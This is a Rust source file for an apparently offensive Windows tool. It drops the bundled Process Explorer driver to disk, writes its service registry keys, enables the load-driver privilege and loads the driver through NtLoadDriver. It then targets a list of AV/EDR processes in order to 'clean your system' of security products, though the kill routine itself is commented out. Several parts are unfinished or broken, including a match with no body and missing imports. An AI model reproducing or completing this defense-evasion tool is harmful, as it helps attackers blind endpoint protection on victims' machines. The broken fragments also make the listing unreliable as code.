use colored::Colorize;
use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntioapi::NtLoadDriver;
use rust_syscalls::syscall;
use std::env;
use std::fs;
use std::ptr;
use std::ffi::CStr;
use std::ffi::CString;
use std::fs::File;
use std::include_bytes;
use std::mem::size_of;
use winapi::um::winnt::*;
use winapi::um::winreg::*;
use std::process::exit;
use std::process::Command;
use std::ptr::null_mut;
use sysinfo::PidExt;
use sysinfo::ProcessExt;
use sysinfo::SystemExt;
use winapi::shared::ntdef::PHANDLE;
use winapi::shared::ntdef::{HANDLE, NULL, OBJECT_ATTRIBUTES};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::winbase::LookupPrivilegeValueW;
use winapi::ctypes::*;
use winapi::shared::minwindef::*;
use winapi::shared::ntdef::{NTSTATUS, PUNICODE_STRING, UNICODE_STRING};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::winnt::*;
use winapi::um::winreg::*;
use winapi::um::processthreadsapi::{OpenProcessToken, GetCurrentProcess};
use winapi::um::winbase::LookupPrivilegeValueA;
use winapi::um::securitybaseapi::AdjustTokenPrivileges;
use winapi::um::libloaderapi::GetProcAddress;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING, GetFinalPathNameByHandleA};
use windows::Win32::Security::SE_LOAD_DRIVER_NAME;
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use widestring::WideString;

const DRIVERNAME: &str = "ProcExp64";

fn load_driver(reg_path: String) -> bool {
    // thanks to https://github.com/DownWithUp/KLoad/blob/8532cee0c0ea4c361b22fb8bd24094a636a76eec/src/main.rs#L30

    let wstr = WideString::from_str(&reg_path);
    unsafe {
        let mut driver_reg_path: UNICODE_STRING = std::mem::zeroed();
        driver_reg_path.Buffer = wstr.as_vec().as_ptr() as *mut u16;
        driver_reg_path.Length = (wstr.len() * 2) as u16;
        driver_reg_path.MaximumLength = driver_reg_path.Length + 2;

        //let ntstatus = syscall!("NtLoadDriver", p_drivername);
        let ntstatus = NtLoadDriver(&driver_reg_path as *const UNICODE_STRING as *mut UNICODE_STRING);
        match ntstatus {
            0 => {
                let message = format!("[+] Successfully used NtLoadDriver");
                println!("{}", message);
            }
            _ => {
                let message = format!("[-] NtLoadDriver call failed.. NTSTATUS: {}", ntstatus);
                println!("{}", message);
                return false;
            }
        }
    }
    return true;
}

fn enable_loaddriver_privilege() -> bool {
    // source: https://github.com/rayiik/mimiRust/blob/main/src/utilities/mod.rs
    unsafe {
        let mut htoken = null_mut();
        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();

        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        let ntstatus = LookupPrivilegeValueW(
            null_mut(),
            SE_LOAD_DRIVER_NAME.as_ptr(),
            &mut privilege.Privileges[0].Luid,
        );
        match ntstatus {
            FALSE => {
                let message = format!(
                    "[-] LookupPrivilegeValueW call failed.. NTSTATUS: {}",
                    ntstatus
                );
                println!("{}", message);
                println!("{}", GetLastError());
                let _ = syscall!("NtClose", htoken);
                return false;
            }
            _ => {
                let message = format!(
                    "[+] Successfully used LookupPrivilegeValueW with value {}",
                    ntstatus
                );
                println!("{}", message);
            }
        }

        let ntstatus = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut htoken);
        match ntstatus {
            FALSE => {
                let message = format!("[-] OpenProcessToken call failed.. NTSTATUS: {}", ntstatus);
                println!("{}", message);
                println!("{}", GetLastError());
                let _ = syscall!("NtClose", htoken);
                return false;
            }
            _ => {
                let message = format!("[+] Successfully used OpenProcessToken");
                println!("{}", message);
            }
        }
        /*
        let ntstatus = NtOpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES,
            htoken
        );
        match ntstatus {
            0 => {
                let message = format!("[+] Successfully used NtOpenProcessToken");
                println!("{}", message);
            }
            _ => {
                let message = format!(
                    "[-] NtOpenProcessToken call failed.. NTSTATUS: {}",
                    ntstatus
                );
                println!("{}", message);
            }
        }

        let ntstatus = syscall!(
            "NtOpenProcessToken",
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES,
            htoken
        );
        match ntstatus {
            0 => {
                let message = format!("[+] Successfully used NtOpenProcessToken");
                println!("{}", message);
            }
            _ => {
                let message = format!(
                    "[-] NtOpenProcessToken call failed.. NTSTATUS: {}",
                    ntstatus
                );
                println!("{}", message);
            }
        }
        */

        let ntstatus = AdjustTokenPrivileges(
            htoken as HANDLE,
            0,
            &mut privilege,
            std::mem::size_of_val(&privilege) as u32,
            null_mut(),
            null_mut(),
        );

        match ntstatus {
            0 => {
                let message = format!(
                    "[-] AdjustTokenPrivileges call failed.. NTSTATUS: {}",
                    ntstatus
                );
                println!("{}", message);
                let _ = syscall!("NtClose", htoken);
                return false;
            }
            _ => {
                let message = format!(
                    "[+] Successfully used AdjustTokenPrivileges. NTSTATUS: {}",
                    ntstatus
                );
                println!("{}", message);
            }
        }
        let _ = syscall!("NtClose", htoken);

        // for testing purpose:
        let cmd = Command::new("cmd")
            .args(["/C", "whoami /priv"])
            .output()
            .expect("failed to execute process");

        println!("{:#?}", cmd)
        
    }

    return true;
}

fn create_registry_key(
    drivername: &CStr,
    nt_driver_path: &[CHAR; MAX_PATH], path_length: DWORD
) -> Result<(), Box<dyn std::error::Error>> {
    //TODO : take the regitry key func from KLoad project, winreg does not work.
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("SYSTEM")
        .join("CurrentControlSet")
        .join("Services")
        .join(&drivername);

    let (key1, _) = hkcu.create_subkey(&path)?;
    let value: u32 = 1;
    key1.set_value("Type", &value)?;

    let (key2, _) = hkcu.create_subkey(&path)?;
    key2.set_value("ErrorControl", &value)?;

    let (key3, _) = hkcu.create_subkey(&path)?;
    key3.set_value("Start", &value)?;

    let driverpath = driverpath.to_str().unwrap();
    let (key4, _) = hkcu.create_subkey(&path)?;
    key4.set_value("ImagePath", &driverpath)?;

    Ok(())
}

// Converts the input driver path to an VOLUME_NAME_NT file path. This is done by temporarily opening the file.
fn get_nt_path(driver_path: &CStr, nt_file_path: &mut [CHAR; MAX_PATH]) -> Result<DWORD, DWORD> {
    unsafe {
        let file_handle  = CreateFileA(driver_path.as_ptr() as *const i8, GENERIC_READ, FILE_SHARE_READ, 
            ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut());

        if file_handle == INVALID_HANDLE_VALUE {
            println!("GLE for CreateFile is: {}", GetLastError());
            return Err(GetLastError());
        }

        let return_size = GetFinalPathNameByHandleA(file_handle, nt_file_path.as_ptr() as *mut i8, MAX_PATH as u32, 
        FILE_NAME_NORMALIZED | VOLUME_NAME_NT);
        if return_size == 0 {
            println!("Failed on GetFinalPathNameByHandleA");
            return Err(GetLastError());
        }

        CloseHandle(file_handle);

        return Ok(return_size);
    }
}

fn write_driver() -> Result<PathBuf, Box<dyn std::error::Error>> {
    let driver = include_bytes!("../resources/PROCEXP.sys");
    fs::write("PROCEXP", driver)?;
    let path = fs::canonicalize(Path::new(r".\PROCEXP"))?;

    Ok(path)
}

pub fn is_elevated() -> bool {
    // thanks to https://github.com/redcode-labs/Coldfire/blob/109a68f93162711068a110d8b29cca19061776d0/os_windows.go
    let file = File::open("\\\\.\\PHYSICALDRIVE0");
    match file {
        Ok(_) => return true,
        Err(_) => return false,
    }
}

fn main() {
    // product list source https://github.com/BishopFox/sliver/blob/041ae65c61629e65646623e472d658472022d84e/client/command/processes/ps.go
    let file_content = include_str!("../resources/processes.txt");
    let mut product_list: Vec<&str> = vec![];
    for line in file_content.lines() {
        product_list.push(line)
    }

    let args: Vec<String> = env::args().collect();

    let is_elevated = is_elevated();
    match is_elevated {
        true => {
            println!("[+] You have elevated rights, let's go");
        }
        false => {
            panic!("[-] You don't have elevated rights. Aborting..");
        }
    }

    let is_driver_written = write_driver();
    let driverpath = match is_driver_written {
        Ok(path) => {
            println!(
                "[+] Successfully wrote ProcExp driver on disk. Path {:?}",
                path
            );
            path
        }
        Err(e) => panic!("[-] Error while dropping ProcExp driver on disk: {}", e),
    };
    
    let mut nt_driver_path: [CHAR; MAX_PATH] = [0; MAX_PATH];
    let mut nt_driver_path_cstring = CString::new("PROCEXP").unwrap().as_c_str();

    //TODO : get result of get_nt_path
    match get_nt_path(nt_driver_path_cstring, &mut nt_driver_path) 
    let res_create_reg = create_registry_key(DRIVERNAME.to_string(), nt_driver_path_cstring.clone());
    match res_create_reg {
        Ok(()) => println!("[+] Successfully wrote {} registry keys", DRIVERNAME),
        Err(e) => panic!(
            "[-] Error while writting {} registry keys: {}",
            DRIVERNAME, e
        ),
    }

    let res_enable_priv = enable_loaddriver_privilege();
    match res_enable_priv {
        true => {
            println!("[+] Successfully got SE_LOAD_DRIVER privileges !");
        }
        false => {
            panic!("[-] Error while getting SE_LOAD_DRIVER privileges");
        }
    }

    let reg_path = format!("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\{}", DRIVERNAME);
    println!("{}", reg_path.clone());

    let res_load_driver = load_driver(reg_path);
    match res_load_driver {
        true => {
            println!("[+] Successfully loaded {} driver !", DRIVERNAME);
        }
        false => {
            panic!("[-] Error while loading {} driver", DRIVERNAME);
        }
    }

    exit(0);


    if args.len() == 2 {
        println!(
            "[+] Executing tool in custom target mode. Targeting {} process",
            &args[1]
        );
        let target = &args[1];
        //evil(target);
    } else {
        println!("[+] Starting. Attempting to clean your system from nasty AV/EDR solutions..");
        for target in product_list {
            //evil(target);
        }
    }
}
